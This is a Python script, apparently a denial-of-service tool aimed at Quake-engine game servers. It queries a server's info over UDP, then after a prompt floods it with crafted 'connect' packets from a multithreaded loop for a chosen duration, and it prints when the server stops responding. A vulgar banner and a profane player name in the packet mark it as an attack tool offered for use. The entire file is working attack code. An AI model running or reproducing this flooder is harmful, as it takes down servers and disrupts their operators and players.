import socket, sys, os, time, threading
QC = {
    "0": "\033[30m", "1": "\033[31m", "2": "\033[32m", "3": "\033[33m",
    "4": "\033[34m", "5": "\033[36m", "6": "\033[35m", "7": "\033[37m",
}
R = "\033[0m"
G = "\033[92m"
RED = "\033[91m"

def colorize(s):
    out = ""
    i = 0
    while i < len(s):
        if s[i] == "^" and i + 1 < len(s) and s[i+1] in QC:
            out += QC[s[i+1]]
            i += 2
        else:
            out += s[i]
            i += 1
    return out + R


def query(ip, port, timeout=2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(b"\xff\xff\xff\xffinfo 49\n", (ip, port))
        data, _ = s.recvfrom(8192)
    except (socket.timeout, OSError):
        return None
    finally:
        s.close()

    if data.startswith(b"\xff\xff\xff\xff"):
        data = data[4:]

    text = data.decode("latin-1", "replace").replace("\n", "").strip()
    if text.startswith("info"):
        text = text[4:]

    parts = text.split("\\")
    info = {}
    for i in range(1, len(parts) - 1, 2):
        info[parts[i]] = parts[i+1]
    return info


def show(info, ip, port):
    if not info:
        print(f"{RED}[-] no response to info query{R}")
        return
    print(f"\n[+] Server {ip}:{port}")
    print("─" * 50)
    print(f"  Hostname : {colorize(info.get('host', '?'))}")
    print(f"  Map      : {info.get('map', '?')}")
    print(f"  Players  : {info.get('numcl', '?')} / {info.get('maxcl', '?')}")
    print(f"  Gamedir  : {info.get('gamedir', '?')}")
    print(f"  Protocol : {info.get('p', '?')}")


os.system('cls' if os.name == 'nt' else 'clear')
print(G + r"""
╔═══════════════════════════════════╗
║   yarrak server fucker by reBash  ║
╚═══════════════════════════════════╝
""" + R)

if len(sys.argv) >= 3:
    ip, port = sys.argv[1], int(sys.argv[2])
else:
    ip = input(f"{G}[*] IP: {R}").strip()
    port = int(input(f"{G}[*] PORT: {R}").strip() or "27015")

show(query(ip, port), ip, port)

if input(f"\n{G}[?] attack server? (y/n): {R}").strip().lower() != "y":
    print("cancel.")
    sys.exit(0)

duration = int(input(f"{G}[*] Time of attack: {R}").strip() or "60")

PACKET = b"\xff\xff\xff\xffconnect 49 yarrrrrrrrrak \"\\uuid\\999999999998\\qport\\20000\\ext\\1\" \"\\name\\orospu\"\n"
stop = threading.Event()


def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        while not stop.is_set():
            for _ in range(100):
                try:
                    s.sendto(PACKET, (ip, port))
                except OSError:
                    pass
            time.sleep(0.001)
    finally:
        s.close()


def watch():
    while not stop.is_set():
        if query(ip, port, 1.5) is None:
            print(f"{RED}[!] Server downed.{R}")
        time.sleep(1)


print(f"{G}[+] sending attack... ({duration}s){R}")

threading.Thread(target=flood, daemon=True).start()
threading.Thread(target=watch, daemon=True).start()

t = time.time()
try:
    while time.time() - t < duration:
        time.sleep(0.2)
except KeyboardInterrupt:
    pass

stop.set()
time.sleep(0.5)
print(f"{G}[+] done.{R}")
